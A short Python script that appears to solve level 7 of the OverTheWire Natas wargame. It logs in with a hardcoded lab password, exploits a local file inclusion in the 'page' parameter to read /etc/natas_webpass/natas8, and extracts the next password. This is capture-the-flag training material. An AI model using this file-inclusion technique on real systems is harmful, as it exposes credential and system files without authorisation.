#!/usr/bin/python3
import re
import requests

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

url = 'http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'%(username)
auth = (username, password)


print(url)
response = requests.get(url, auth=auth)
print(response.text)

next_password = (re.findall("<br>\\n<br>\\n(.*)",response.text))[0]

print(next_password)




